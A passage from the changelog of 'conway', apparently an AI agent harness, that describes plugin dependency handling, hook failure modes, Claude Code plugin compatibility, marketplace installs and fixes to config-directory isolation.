  deciding what precedes what in an assembled prompt. A regression test
  installs two instruction-declaring plugins with a `requires` edge that
  would reorder them under a naive topological-injection scheme, and
  asserts the assembled context still orders fragments by install order.
- **A subprocess plugin can now declare `requires`/`optional` too, closing
  the privilege asymmetry the same-morning item above left open for the
  out-of-process tier** — board item `01M0XCD3P8S3VR0T1H0KNG5TMD`. Until
  now `PluginManifest::requires`/`optional` had nowhere to come from on the
  wire: `WireManifest` (`crates/conway-plugin-subprocess/src/wire.rs`)
  carried `required_host_caps` but not plugin-to-plugin dependencies, so an
  in-process plugin could declare it depended on another plugin and an
  out-of-process one could not — exactly the asymmetry
  `docs/vision/DESIGN-plugin-dependencies.md` §2 and `ports/plugin.rs`'s
  own "there is exactly one extension mechanism ... nothing about them is
  privileged" argue against. `WireManifest` gains `requires`/`optional`
  (`Vec<String>`, both `#[serde(default)]` so an older plugin's
  `tool.spec/1` answer that omits them loads unchanged — a `minor`-
  compatible addition per `docs/plugins/compatibility.md`'s versioning
  table), carried verbatim by `SubprocessPlugin::discover` into the SAME
  `PluginManifest::requires`/`optional` fields an in-process `Plugin`
  populates, checked by the SAME `ConwayBuilder::build` dependency-
  resolution code, over the resolved set — not a second resolution path.
  Declaring a dependency is this item; a subprocess plugin *providing* a
  capability another plugin calls (Edge B) is a separate, larger item,
  still open.
- **The interactive `/plugin` browser now enforces `requires`/`optional`
  at toggle time, not only at the next restart's `build()`** — board item
  `01M0WWMQZN5WK1AADKW4WKTQQZ`
  (`docs/vision/DESIGN-plugin-dependencies.md` §3/§4b). Before this item,
  turning a plugin OFF while an enabled plugin still `requires` it wrote
  straight to `settings.json` and printed a cheerful "turned off" notice
  — the operator found out the dependent broke only at the next restart.
  `App::apply_plugin_toggle` now refuses that write, before it happens,
  naming the still-enabled dependent; toggling off a merely `optional`
  dependency stays allowed, with a Notice naming what presentation/
  convenience is lost (the dependent's core function is unaffected).
  Toggling ON a plugin whose bundled `requires` is unmet no longer
  silently writes either plugin — an offer notice names the missing,
  bundled dependency and how to proceed (a dependency this binary does
  not even link at all is refused outright, matching the marketplace
  trigger's own refusal to auto-install a non-bundled dependency, a
  distinct enablement point this item does not touch). A degraded plugin
  (installed, with a missing `optional` dependency) now says so in the
  browser itself: `PluginBrowserEntry::description.you_lose` carries a
  `[DEGRADED: ...]` annotation, refreshed idempotently after every toggle
  and rendered by `view/plugins.rs`'s existing detail panel with no
  renderer change needed. The pre-existing "the mirror flips only on a
  successful write" guarantee holds for a refusal too — checked against
  `settings.json` itself, not merely that an error was shown. The
  decision logic (`App::apply_plugin_toggle_against`) is split out from
  bundle resolution specifically so it can be driven against a fabricated
  manifest graph in tests: no real first-party plugin declares a
  `requires`/`optional` edge yet, so a test that could only exercise the
  real compiled-in bundle could never observe a refusal. The true
  one-keystroke "accept the offer and enable both" interactive affordance
  is left as a disclosed follow-up — it needs a new confirm surface on
  the `/plugin` browser's own row (`view/plugins.rs`/`input.rs`), outside
  this item's file scope.
- **A `pre_tool_use` hook registration can now declare `on_failure:
  "deny" | "prompt"` (default `"deny"`), so a guard's own OUTAGE no longer
  has to look identical to its VERDICT** — board item
  `01M0X1AH44SNMK5TZ507K30QNP`
  (`docs/vision/DESIGN-permission-modes.md` §3a/§3c). Before this item,
  `PermissionBroker::pre_tool_use_hook_denial` collapsed two structurally
  different facts — a hook running and returning an explicit
  `HookPermissionVerdict::Deny` ("the guard said no"), and a hook's own
  runner failing outright (missing script, timeout, or unparseable stdout;
  "the guard is down") — into the identical `Option<String>` value,
  distinguishable only by parsing the rendered text for a trailing `--
  fail-closed`. Fail-closed is correct for an operator-authored policy
  script (its breakage is the operator's own), but wrong for a guard
  backed by infrastructure the operator does not directly control (e.g. a
  local model server): every tool call denies whenever it is unreachable,
  presenting as the agent being unable to do anything rather than as "your
  guard is down." A new `conway_core::hook::HookOnFailure` enum (`Deny` |
  `Prompt`, **no `Allow` variant — unrepresentable in the type, not merely
  rejected at runtime**, the identical guarantee `HookPermissionVerdict`
  already gives a hook's own verdict) rides on `HookEntry::on_failure`
  (`crates/conway/src/config/schema.rs`, `#[serde(default)]`) and
  `PreToolUseHookSpec::on_failure` (`crates/conway-runtime/src/
  permission.rs`). `Deny` (the default) reproduces today's exact
  byte-for-byte fail-closed behavior, message included, for every existing
  registration that never sets the field. `Prompt` narrows an outage to
  the operator's own `gate.check` instead of denying outright — never a
  widening, and never able to bypass the operator's own `deny` rules or
  plan-mode refusal, both of which still fire unconditionally before and
  after the hook step in `PermissionBroker::decide`'s existing order.
  `on_failure` is consulted ONLY when a hook's runner itself fails; an
  explicit `Deny` verdict from a hook that ran successfully always denies,
  regardless of that hook's own `on_failure` setting. The two facts are
  now also distinguished STRUCTURALLY, not only in rendered text: a new
  private `HookStepOutcome`/`HookDenialCause` pair
  (`crates/conway-runtime/src/permission.rs`) tags a denial `Verdict` or
  `Outage`, so a future downstream consumer could match on the cause
  directly rather than string-matching the message. `docs/plugins/
  hooks.md`'s status table (points 8 and 13) is corrected to record which
  parts of the `on_failure` vocabulary it already specified are now built.
- **A Claude Code plugin's `hooks/hooks.json` now translates into real,
  dispatchable conway `[hooks].rules[]`-shaped registrations** — board
  item `01M0X1FCQ80C9ET97HENXSAW2K`, `crates/conway-plugin-claude`'s own
  `hooks` module, carrying an earlier item's name-level-only mapping
  (`01M0VR89FB1F3Q4FQ8852K2A5E`) the rest of the way. Six Claude Code
  events map onto conway's own eight (`SessionStart`/`UserPromptSubmit`/
  `PreToolUse`/`PostToolUse` exactly; `SubagentStart`->`child_spawned` and
  `SubagentStop`->`child_reported` **approximate**, per the operator
  ruling's own best-effort-and-disclosed appetite — the one known
  divergence for `child_reported` is named in the module doc and the new
  coverage table alike). `ClaudeCompatReport::hook_registrations()` hands
  back a `HookRegistration` per `Mapped` rule: the Claude Code command
  STRING wrapped, never word-split, as `["/bin/sh", "-c", <command>]`,
  with `${CLAUDE_PLUGIN_ROOT}` already resolved to the discovered plugin
  directory's own absolute path (every real `hooks.json` checked against —
  `beepboop` 1.4.0, `ideate` 3.2.2 — uses that token in every command).
  Proven dispatching end to end, over the real `ProcessHookRunner`, for
  one observation-tier event (`session_starting`, fail-open) and one
  deny-capable event (`pre_tool_use`, fail-closed, with a `matcher`) — not
  a hand-built fixture standing in for dispatch. Zero new core events: an
  unmapped event (nineteen of `beepboop`'s twenty-five) is still declined
  and named, never silently dropped, and `SessionEnd` specifically stays
  declined and settled (operator ruling, `docs/vision/
  DESIGN-permission-modes.md` §9) — not reopened by this item.
  `docs/plugins/claude-compat.md` gets a coverage table (every event
  either real plugin declares, its status — maps/approximate/declined —
  and, for the mapped ones, the fail-open-or-closed posture it inherits)
  and its own former "nothing is wired to dispatch" sentence corrected.
  This crate still never mutates a `HooksConfig` itself — a caller appends
  the registrations into its own `[hooks].rules[]`; `conway-cli`'s own
  `[plugins].claude_compat[]` install path does not perform that append
  yet (still MCP-only), a disclosed, separate follow-up.
- **`[plugins].claude_compat[]` now dispatches its translated hooks, not
  only its MCP servers** — board item `01M0XBZNBPXEESX8VNTJDKNG0J`, closing
  the gap the item immediately above disclosed and left open. Until this
  item, `crates/conway-cli/src/claude_compat_plugins.rs` attached only the
  MCP half of what a discovered Claude Code plugin directory declared: a
  `hooks/hooks.json` rule translated cleanly
  (`ClaudeCompatReport::hook_registrations()`) but nothing ever appended
  it into the `HooksConfig` `ConwayBuilder::build` reads, so it was
  reported, never dispatching — the built-but-unreachable defect
  `DESIGN-plugin-dependencies.md` §1 names as this tree's recurring
  disease, and the one gap standing between beepboop's own smoke test
  (`01M0X3AMASEJGHZ6ZDMDFWCHSE`) and hearing a sound actually play.
  `ConwayBuilder` gains `config_mut()` (`crates/conway/src/builder.rs`) —
  the write counterpart `config()` never had, and the narrowest seam that
  let `install` append into `[hooks].rules[]` without reconstructing the
  builder (which would have dropped every plugin/gate/router already
  attached). Every translated rule keeps `on_failure: Deny` — this layer
  never sets it, `HookEntry::default`'s own fail-closed value survives
  untouched, deliberately: a translation layer must not silently choose a
  foreign plugin's own outage posture on the operator's behalf. `install`
  also now reports, on stderr, which registered hooks CAN deny a real tool
  call (`pre_tool_use`, unconditional `diag::warn`, naming each rule id)
  versus which are observation-only (`diag::info`, verbose-only) — never
  one undifferentiated "hooks registered" line, since a `pre_tool_use`
  rule from a foreign plugin is a real permission consequence of naming a
  directory in `settings.json`. The payload-shape caveat
  `crates/conway-plugin-claude/src/hooks.rs` and `docs/plugins/
  claude-compat.md` already stated is unchanged and unweakened: a
  dispatched hook script still reads Claude Code's own `tool_name`/
  `tool_input` shape on stdin, not conway's `HookInvocation`/`HookEvent`
  payload — "dispatches" was never the same claim as "behaves identically
  to real Claude Code," and wiring dispatch does not quietly upgrade it.
  `docs/plugins/claude-compat.md`'s own "does not perform that append yet"
  sentence (the item immediately above quotes it) is corrected to describe
  today's behavior.

- **A Claude Code plugin's `commands/*.md` files now translate into real,
  invokable conway commands** — board item `01M0X1G29EZSFEWB1YAG40SE69`,
  closing the deferral `01M0VR89FB1F3Q4FQ8852K2A5E` named and
  `01M0VSMF71S6VXX81YRAAF5S8Q` (`CommandOutcome::SubmitPrompt`) made
  possible. `crates/conway-plugin-claude`'s new `commands` module turns
  most `commands/*.md` files into a real `conway_core::ports::Command`
  (`ClaudeCommand`) whose `invoke` submits the file's own
  frontmatter-stripped body via `CommandOutcome::SubmitPrompt`;
  `ClaudeCompatReport::command_registrations()` hands back the
  ready-to-install list. Proven end to end against `beepboop` 1.4.0's real
  `commands/config.md` — a real `Conway`/`SessionHandle::prompt_command`,
  no TUI in the loop (`tests/commands_dispatch.rs`), the identical
  library-API path `conway_plugin_skeleton::FilePromptCommand`'s own
  end-to-end test already proved out for an operator-authored prompt file.
  Best effort, not parity, per the operator ruling this item was scoped
  under: v1 performs no `$ARGUMENTS`/argument interpolation of any kind,
  so a command body containing a raw `$ARGUMENTS` placeholder is refused
  rather than submitted verbatim (named in `unsupported`, like anything
  else this layer cannot use); every frontmatter key besides `description`
  (which becomes the command's own one-line summary) is named as ignored
  even on a command that otherwise translates — a new
  `UnsupportedKind::CommandFrontmatterKey` — with `allowed-tools`
  specifically getting a *permission*-shaped reason (an ignored Claude
  Code tool restriction is a permission surprise, not merely a fidelity
  gap). Namespacing is reused, not invented: a translated command's own
  name is always bare, the same "an author never picks their own
  namespace" rule `conway_core::ports::Plugin::commands` already
  establishes, so shadowing a built-in stays impossible by the identical
  structural guarantee (`validate_command_name`) every other plugin
  command already relies on — nothing new to check here. This crate now
  depends on `conway-core` in production code for the first time (only
  `Command`/`CommandOutcome`/`CommandCtx`/`CommandSpec`; still never the
  `conway` facade). `docs/plugins/claude-compat.md`'s `commands/*.md` "not
  wired" paragraph is corrected to describe what is true now and what
  still is not.
- **`[plugins].claude_compat[]` now reaches a `commands/*.md` file all the
  way to a running `conway` process, not only `conway-plugin-claude`'s own
  library-level tests** — board item `01M0XRCAFD7DD7N64RNRM3P8W9`, the
  audit's single CRITICAL finding, closing the gap the item immediately
  above left standing: `crates/conway-cli/src/claude_compat_plugins.rs`
  never called `ClaudeCompatReport::command_registrations()` at all, so an
  operator naming a directory in `settings.json` got zero working commands
  from it. **Tracing the whole path found a SECOND, deeper joint, fixed in
  this same item**: `conway::plugin::Plugin::commands()` has no reader
  inside the facade whatsoever (`ConwayBuilder::build` never looks at it)
  — the only reader is `conway_cli::tui::commands::CommandRegistry::build`,
  fed by `first_party_plugins::installed_plugins`, which RE-DERIVES its
  plugin list from `conway.config()` rather than reading back whatever
  `ConwayBuilder::with_plugin` attached at build time. Merely calling
  `command_registrations()` from `install` and attaching the result via
  `with_plugin` would still have produced zero reachable commands.
  `claude_compat_plugins` gains a new `command_plugins` function — called
  from `first_party_plugins::installed_plugins` instead, the SAME
  re-derive-from-config seam that already feeds the first-party bundle —
  so a translated command now shows up in the slash palette, dispatches
  through the ordinary `<plugin-id>.<name>` path (both the TUI's
  `/`-prefixed dispatch and the `conway <plugin-id>.<command>` external
  subcommand), cannot shadow a built-in, and submits its prompt for real.
  Proven through the compiled binary, not the library API alone:
  `crates/conway-cli/tests/claude_compat_commands.rs` drives a real
  `conway <plugin-id>.<command>` invocation end to end and asserts the
  persisted `LogRecord::UserTurn`/`Provenance::CommandPrompt` names the
  translated command's own full name. `docs/plugins/claude-compat.md`'s
  `commands/*.md` bullet is corrected again: it previously claimed
  "proven end to end" while nothing in `conway-cli` ever reached this far;
  it now states what is actually wired, with the same "best effort, not
  parity" caveats (no `$ARGUMENTS` interpolation, `allowed-tools` named but
  not enforced) unweakened.

- **conway can now install a plugin from a Claude Code marketplace** —
  board item `01M0VR96Y87FF2BVNTBSC6GEYR`, the network-reaching half of the
  plugin feature (trust was ruled settled beforehand: decision
  `01M0VS2M8FC25QYCATQ8PKQ73Y`, `docs/plugins/trust-and-security.md`). A
  new `crates/conway-plugin-marketplace` crate fetches a marketplace's
  JSON manifest over HTTP and, per plugin, every file its `files: {path
  -> URL}` map declares — no git clone, no archive extraction, each file
  fetched and path-validated individually (refuses any relative path whose
  components are not all ordinary, before writing a byte) — into
  conway's own plugin store (`<config dir>/plugins/marketplace/<id>`),
  never partially: a staging directory is committed by a single `rename`
  only once every declared file has landed. A fetched artifact is declared
  to conway the exact same way a directory an operator prepared by hand
  already is (spec update to the item: a fetched artifact needs nothing
  more than `{ id, dir }`) — an ordinary `[plugins].claude_compat[]` entry,
  written by a NEW config writer, `conway::config::set_claude_compat_entry`
  (`crates/conway/src/config/writer.rs`), the array-of-OBJECTS sibling
  `set_plugin_installed` (array-of-strings) did not have: built from the
  identical hand-rolled scanner/splicer so an operator's comments, key
  order, and formatting survive a write untouched, exactly as
  `set_plugin_installed` already guarantees for `plugins.install`.
  `crates/conway-cli/src/tui/app/marketplace.rs` wires fetch+install+write
  into one operator action (`App::apply_marketplace_install`) that
  discloses what is being installed — name, description, version, every
  file and its source URL, the destination directory, and the
  unsandboxed-privilege caveat — before anything is written, and a
  matching `App::apply_marketplace_uninstall` that removes both the config
  entry and the artifact, leaving neither behind. Offline, a bad URL, and
  a malformed marketplace response are each a named, typed error with
  nothing written to `settings.json` — never a hang (a bounded client
  timeout) and never a partial install. **No digest check, no allow-list,
  no trust prompt** — settled, not re-argued: a fetched artifact runs on
  the identical footing `[hooks].rules[].command` already has. No
  interactive slash-command/menu trigger is wired yet (deliberately
  deferred; the methods are real, tested, and end-to-end-correct). Full
  argument in `docs/plugins/marketplace.md`.

- **conway can now read a Claude Code plugin directory already on disk and
  bring its MCP server declarations in as real, working plugins** — board
  item `01M0VR89FB1F3Q4FQ8852K2A5E`, a new `crates/conway-plugin-claude`
  crate plus a fourth `[plugins].claude_compat[]` config tier resolved by
  `crates/conway-cli/src/claude_compat_plugins.rs`. No downloading: the
  operator names a directory they already have, and it is read fresh
  (never written to config) every time conway starts. Only `.mcp.json`
  server declarations are wired to actually run, translated into the
  identical `conway_plugin_mcp::McpPluginSpec` path an operator-authored
  `[plugins].mcp[]` entry already uses. Equally prominent: everything a
  Claude Code plugin directory can contain that this item does NOT import —
  every `commands/*.md`, every `skills/<name>`, every `agents/*.md`, and
  every hook event with no conway counterpart (`Stop`/`SubagentStop`/
  `Notification`/`PreCompact`/`SessionEnd`) — is named individually, never
  silently dropped, both in the library's own `ClaudeCompatReport` and on
  the directory's own `/plugin` row (`view/plugins.rs`'s fourth
  `PluginOrigin`, `claude-compat`). Full argument, and what a directory's
  entries would need to become truly wired, in `docs/plugins/
  claude-compat.md`.

- **An operator can now add their own standing instructions to every
  session, via a file — `conway.idiom` reads `instructions.md`** — board
  item `01M0VR4GMGSZ2682T908JCGVFG`. Before this, the only lever for
  house conventions ("this repo does X", "prefer Y over Z") was
  `--system-prompt`/`--append-system-prompt`, reachable only on the
  one-shot CLI path and REPLACING the whole system-prompt segment rather
  than adding to it — an interactive operator had nothing. Following Pi's
  `AGENTS.md`/`SYSTEM.md` precedent (a file, not a new `[plugins]` config
  key — `PluginsConfig` has no per-plugin operator configuration surface
  today, and adding one would be a schema change for text with no reason
  to be a TOML value), `conway.idiom` now reads
  `<project>/.conway/instructions.md` and the global-scope
  `instructions.md` alongside conway's user-scoped `settings.json` (that
  is, `<home>/.conway/instructions.md` when `CONWAY_CONFIG_DIR` is unset,
  or `<CONWAY_CONFIG_DIR>/instructions.md` when it is set — board item
  `01M0W5Q569F0T97HSEP6F0MPCR` closed the isolation gap this file
  originally shipped with, the same shape board item
  `01M0VV6CVSZM4XH8J4G6EBV5E3` closed for `settings.json` itself, below)
  when either exists, contributing each as its own named, additive
  `InstructionFragment` (`conway.idiom.operator.project`/`conway.idiom.
  operator.global`) alongside the plugin's shipped idioms primer — neither
  file's presence disables the other, and `/context` renders each one's
  own token cost separately. Reaches a forked or spawned child on the
  identical footing as the shipped fragment (board item
  `01M0VSKA76NSEHDSH25XJGJ2J5`'s ruling applies uniformly). A missing or
  empty file is silent and normal; a file that exists but cannot be read
  cleanly (a permissions error, a directory where a file was expected,
  invalid UTF-8) fails the build loudly instead, naming the path: a file
  the operator wrote and conway silently ignored is exactly the failure
  mode this project cares most about. Every fragment this plugin
  contributes, operator-authored or shipped, is still stamped
  `Provenance::Skill` on the wire — a known, disclosed limitation
  (`crates/conway-plugin-idiom`'s own module doc), not fixed by this item;
  a `Provenance::Operator` variant is a persisted wire-format change and a
  separate decision. See `docs/plugins/idiom.md` for the full precedence
  and provenance write-up.

- **A command can now submit a prompt — `CommandOutcome::SubmitPrompt`,
  reachable from the TUI, the one-shot CLI, and the library API alike** —
  board item `01M0VSMF71S6VXX81YRAAF5S8Q`. Before this, a plugin command
  could print text, report an error, fork the session, mask a record, or
  check out a different session — but nothing could put text into the
  conversation as a new turn, which is the whole job of a prompt-template
  command (`/review-this`, `/explain`, the shape most Claude Code plugins'
  slash commands are built on). `CommandOutcome::SubmitPrompt { text }`
  closes that gap: the host submits `text` as a new turn on the invoking
  agent, exactly as if the operator had typed it, through
  `conway::SessionHandle::prompt_command` — a facade primitive reachable by
  the TUI's `App`, `conway`'s one-shot `<plugin-id>.<command>` dispatch,
  and any bare library embedder, never a TUI-only code path (this
  project's "no capability may exist in only one mode" rule). The
  resulting turn is stamped with a new, dedicated `Provenance::
  CommandPrompt { command }` — never `Provenance::UserPrompt` — so the
  durable log, and `/context`'s own provenance rendering, can always tell
  a command-submitted turn apart from one the operator actually typed.
  This is a persisted wire-format addition to `Provenance`: every record
  written before this variant existed still decodes unchanged. v1
  performs no interpolation of any kind — the submitted text is always a
  literal string a `Command::invoke` implementation builds itself, with no
  template syntax this crate parses. Submitting while the same agent
  already has a turn in flight is refused, not raced in silently — a new
  guard in `App::apply_plugin_command_done`, tested and shown to fail
  without it. `conway-plugin-skeleton`'s new `FilePromptCommand` is the
  conway-native, file-backed demonstration: it reads a markdown file once
  and submits its body verbatim every time the command is typed — proof
  that a markdown file becomes a typeable command with no Rust beyond a
  handful of lines. Wiring Claude Code's own `commands/*.md` to this
  capability is a separate, unbuilt follow-up.

- **A `/plugin` command lists every kind of plugin conway can run today —
  compiled-in, subprocess, and MCP — in one place** — board item
  `01M0VR5RCCB8NDGG2JEQW8X7XR`. Before this, the only plugin listing in
  the TUI was `/settings`' own plugins section, and it read only the
  compiled-in first-party bundle: an operator with a `[plugins].mcp[]` or
  `[plugins].subprocess[]` entry configured had no way to see it anywhere
  in the interface. `/plugin` (`crates/conway-cli/src/tui/view/plugins.rs`,
  a new `SlashCommand::Plugins` variant) reads all three sources and
  renders one row per plugin, each naming its **origin** and honestly
  stating what it contributes: a compiled-in plugin's real
  `PluginDescription` ("you get"/"you lose"/"costs"); a subprocess entry's
  closed wire vocabulary (tools, permission policy, observation, status —
  the `initialize` points `conway_plugin_subprocess::wire` declares); an
  MCP entry's single capability (tools only — the one non-manifest method
  `conway_plugin_mcp::McpPlugin`'s `Plugin` impl has). Only compiled-in
  rows toggle (`Enter`, written to `settings.json`, applies on next
  restart — the SAME writer and restart-to-apply contract the old
  settings section used); subprocess/MCP entries are installed
  unconditionally with no candidate set, so their rows are read-only and
  say so directly on the row rather than silently offering nothing.
  `/settings`' own plugins section is now a single shortcut into `/plugin`
  rather than a second, independent listing over the identical
  `plugins.install` array. The origin model is an open set (a label
  wrapper, not a closed enum) — a later compatibility-layer item that adds
  Claude-format plugins registers a new source function and nothing else
  in this surface changes.

- **A tenth first-party plugin, `conway.idiom`, prepends a short
  conway-idioms instruction fragment to a session** — board item
  `01M0VR3BKW5N3V3WS28H7FV8ZK`. Before this, a bare interactive TUI
  session sent the model tool schemas and the conversation and nothing
  else: `App::session_spec` sets no `agent_def`/`system_prompt_override`,
  and `SessionSpec::system_prompt_override`'s own doc already stated the
  consequence — no system-prompt segment at all in that case. Installing
  `["conway.idiom"]` contributes one `Plugin::instructions()` fragment
  (fork vs. spawn, how an agent ends, configuration-dependent tools,
  context scarcity, permissions, budgets, steering) — 28 lines, 275 words,
  well inside the 40-line/400-word budget measured against Pi's own
  system-prompt template (`docs/vision/INTENT.md`'s citation of Pi as
  conway's extension-surface reference). Lands in `ContextBuilder::build`'s
  `[1] PluginInstructions*` step: ahead of every tool schema and the whole
  conversation always, and ahead of an agent def's own system prompt only
  when that def supplies none — the ordinary bare-session case this item
  exists for. `tool_ids` is deliberately empty: the fragment names
  `conway_fork`/`conway_spawn`/`report` in prose but requires none of them
  to be announced for the rest of the text to hold, and an interactive
  root specifically never has `report` — naming it would silently drop
  the whole fragment from the one session type this plugin targets.
  **Reaches every forked or spawned child too, not the root alone** (board
  item `01M0VSKA76NSEHDSH25XJGJ2J5`'s ruling, below) — corrected from this
  bullet's own original text, which said the opposite. Opt-in, like every
  other first-party plugin.

- **A plugin instruction fragment reaches a forked or spawned child, not
  the root alone** — board item `01M0VSKA76NSEHDSH25XJGJ2J5`. Before this,
  `SubagentHost::start` passed `AgentSpec.instructions: Vec::new()`
  unconditionally to every fork/spawn child, and `resolve_instructions`
  (the function that forwards every installed plugin's `Plugin::
  instructions()` fragments unchanged) was called only for a root or
  resumed agent — disclosed as a caveat in four places (`docs/plugins/
  hooks.md` point 17, `conway-plugin-idiom`'s own shipped fragment text,
  module doc, and `PluginDescription::you_lose`) but never *decided*.
  Ruled: an instruction fragment is harness configuration keyed to tool
  reachability (the pre-existing `tool_ids` gate, unchanged), not
  transcript context, so fork/spawn's "whole transcript vs. empty
  transcript" split does not govern it — the same way it already does not
  govern `plugin_config`, which narrows-and-inherits from the parent for
  spawn exactly as for fork, predating this ruling. `SubagentHost::start`
  now calls the SAME `resolve_instructions`/`resolve_skills`
  `start_root`/`resume_root` already use, for both fork and spawn, with no
  per-mode branch — `resolve_skills` resolves the CHILD's own
  already-resolved `agent_def`, not the parent's, so a fork/spawn with no
  def still gets no skills, exactly as before. The `tool_ids` reachability
  check (`ContextBuilder::build`) composes unmodified: a narrowly-scoped
  child already receives fewer fragments than root, with no new mechanism.
  Full argument at `resolve_instructions`'s own doc
  (`crates/conway-runtime/src/runtime/root.rs`). The four idiom-plugin
  disclosure sites, `docs/plugins/hooks.md`, `docs/plugins/README.md`, and
  this file's own bullet above are corrected to state the ruling rather
  than the prior (now false) description.

- **Shift+Tab cycles the permission mode** — board item
  `01M0WX62C2VGJTXSR7XJBGMM9J`. `Action::CyclePermissionMode` (prompt ->
  plan -> auto-allow) already existed and the app loop already wrote both
  the broker (the authority) and the display mirror together
  (`tui/app/run.rs`) — the only thing missing was a way to reach it
  without opening `/settings` and navigating to its `permission_mode` row.
  `handle_normal_key` (`crates/conway-cli/src/tui/input.rs`) now binds
  `Shift-Tab` to the same `Action::CyclePermissionMode`, matching both
  encodings a terminal might send for the chord (`KeyCode::BackTab`, and
  bare `KeyCode::Tab` carrying the `SHIFT` modifier). Bound in
  `Mode::Normal` only, deliberately — cycling to auto-allow while a
  permission prompt or another modal-bearing surface is up would change
  the meaning of the decision the operator is mid-way through making, and
  every one of those surfaces' own key handlers already swallows an
  unrecognized chorded key rather than needing a carved-out exception. The
  key handler returns the Action; it never writes the broker itself,
  preserving the authority split the settings row's own comment
  documents. `/help`'s keybinding overlay (`tui/view/help.rs`) now lists
  the binding.

- **`HostCapability` opens from a closed two-variant enum to a namespaced
  vocabulary, and `PluginManifest` gains `optional_host_caps`** — board item
  `01M0WWKA8K1E7JPK87J6RRQMZF`
  (`docs/vision/DESIGN-plugin-dependencies.md` §2 Edge A/§4a/§7d). Until
  now, `HostCapability` (`crates/conway-core/src/ports/plugin.rs`) was a
  fixed two-member list (`Subagent`, `PersistentTransport`); a third party
  could never declare a capability core had not already blessed, and
  `docs/plugins/inference-hooks.md:64` referenced `optional_host_caps` as
  though it existed — it did not, anywhere in the tree. It reuses the exact
  naming discipline `crate::event_name::validate_event_name` already
  established for a plugin's own event names (reused, not reimplemented,
  per that item's own instruction): a bare name (`subagent`,
  `persistent_transport`) is reserved for what the core host itself
  blesses and stays a unit variant, so both keep resolving with **no
  `settings.json` change**; any other well-formed name (bare or
  `namespace.name`) constructs `HostCapability::Named` via the new
  `HostCapability::named` constructor. Wire-compatible with the old closed
  form: serialization is still a bare string for every variant, so an
  existing manifest parses unchanged; a malformed tag still fails closed at
  deserialization, only a well-formed but previously-unknown tag now
  succeeds. `PluginManifest::optional_host_caps` (`#[serde(default)]`,
  empty by default) is the host-capability analogue of the `requires`/
  `optional` plugin-to-plugin edges landed the same day: a missing
  *required* cap still hard-fails `ConwayBuilder::build` unchanged
  (`PluginError::MissingHostCapability`, naming both sides); a missing
  *optional* cap now loads the plugin anyway, degraded, and announces it on
  the same two channels `requires`/`optional`'s own missing-optional path
  uses — a `tracing::warn!` plus a `ConfigWarning`
  (`WarningCode::OptionalHostCapabilityMissing`) on `Conway::warnings()` —
  via the new `conway::HostCaps::missing_optional`. `docs/plugins/
  inference-hooks.md:64`'s `optional_host_caps` reference now describes
  something real; no wording change was needed there. No actual new
  capability ships with this item (no `ui.ask/1`, no host profile) — this
  opens the vocabulary and the field only.

### Security

- **`CONWAY_CONFIG_DIR` no longer isolates only half of conway's
  configuration.** — board item `01M0VV6CVSZM4XH8J4G6EBV5E3`. The variable
  relocates the *user* config layer (`$CONWAY_CONFIG_DIR/settings.json`
  instead of `~/.conway/settings.json`), but the separate *project* layer's
  own upward walk from the working directory (`config::discovery::discover`)
  knew nothing about it: for any `cwd` beneath the invoking user's real
  `$HOME`, that walk could still reach `~/.conway/settings.json` and return
  it as the *project* layer, which outranks `user` in the five-source
  precedence order (`default < user < project < env < CLI`) regardless of
  where `CONWAY_CONFIG_DIR` pointed. A run that believed itself isolated —
  a test fixture, an embedder, a hand demo run with a `cwd` under `$HOME` —
  could silently fall back to the operator's real backends and credentials.
  This is not theoretical: it cost two live provider calls on the
  operator's real credentials during this project's own development.
  `discover` now takes an explicit exclusion list
  (`config::discovery::project_discovery_exclusions`) and skips — keeps
  walking past, rather than stopping on — a candidate that names the same
  underlying file (canonicalized when possible, falling back to a lexical
  comparison when a side does not exist) as either the currently-resolved
  user config path or the raw, override-independent
  `~/.conway/settings.json`. An operator who genuinely keeps a project
  directly in `$HOME` sees no behavior change: with `CONWAY_CONFIG_DIR`
  unset the excluded file is applied via the user layer instead, with
  identical content, and a genuinely different, nearer project config is
  still discovered exactly as before. `CONWAY_CONFIG_DIR` still does not
  make itself outrank every possible project config (a real, distinct
  project `.conway/settings.json` between `cwd` and `$HOME` still wins, as
  project always has over user) — only the one file that would otherwise
  double as the global settings is excluded; see
  [`docs/getting-started.md`](docs/getting-started.md#configure-a-provider)
  and [`docs/embedding.md`](docs/embedding.md#loading-config-without-the-ambient-user-layer).
  Proven with a compiled-binary regression test
  (`crates/conway-cli/tests/config_isolation_binary.rs`) driving the real
  `conway` binary against a simulated `$HOME`, shown to fail against the
  unmodified code before the fix landed.

- **The operator-global instructions file now honours `CONWAY_CONFIG_DIR`
  too** — board item `01M0W5Q569F0T97HSEP6F0MPCR`, the identical isolation
  gap the entry above closed for `settings.json`, reintroduced (while still
  latent — the file did not yet exist on the reporting operator's own
  machine) by board item `01M0VR4GMGSZ2682T908JCGVFG` a few hours later:
  `conway_plugin_idiom::global_instructions_path` derived from
  `conway::config::discovery::home_settings_path` (the raw,
  override-independent home path) rather than `user_config_path(env)` (the
  one that honours the variable), so an operator who set
  `CONWAY_CONFIG_DIR` to relocate conway's config directory would still
  have had their real `~/.conway/instructions.md` read and injected into
  every session's context. `global_instructions_path`/
  `resolve_operator_paths` (`crates/conway-plugin-idiom/src/lib.rs`) now
  take an explicit `env: &HashMap<String, String>` and derive from
  `user_config_path(env)` instead — threaded through
  `first_party_plugins::resolve_idiom_plugin` and its callers
  (`install`/`all_bundle_plugins`/`installed_plugins`,
  `crates/conway-cli/src/first_party_plugins.rs`), `commands::plugin::run`,
  and `main.rs`'s own `build_conway`/`dispatch`, each resolved from a single
  `std::env::vars()` read at that binary's one entry point (mirroring
  `tui::app::App::new`'s own `env_vars` field) rather than a fresh ambient
  read at any of those call sites. Proven with a compiled-binary regression
  test (`crates/conway-cli/tests/global_instructions_isolation.rs`) driving
  a real one-shot turn against a scripted backend and asserting on the
  captured wire request, shown to fail against the unmodified code before
  the fix landed.

### Fixed

- **`/resume` no longer drops a plugin's status-contribution snapshot from
  the status line** — board item `01M0XDEDBR5YDF71Q7ZRXYMT85`, the third
  and final link in a chain three items closed one gap at a time: a plugin's
  `status_contributions()` were collected and exposed on the facade
  (pre-existing), then rendered (`01M0X1B7Z41J57N6YP2JFZ2AZW`), then
  populated into `AppState` at TUI startup (`01M0XC1GF73Z9GTE7TN65TRW4A`) —
  and each of those items correctly left `commands::execute`'s `Resume` arm
  alone, which already hand-carried `plugin_commands`/`agent_names` (both
  process-lifetime, `Conway`/binary-level values) across the `AppState::new`
  reset a `/resume` performs, but never carried
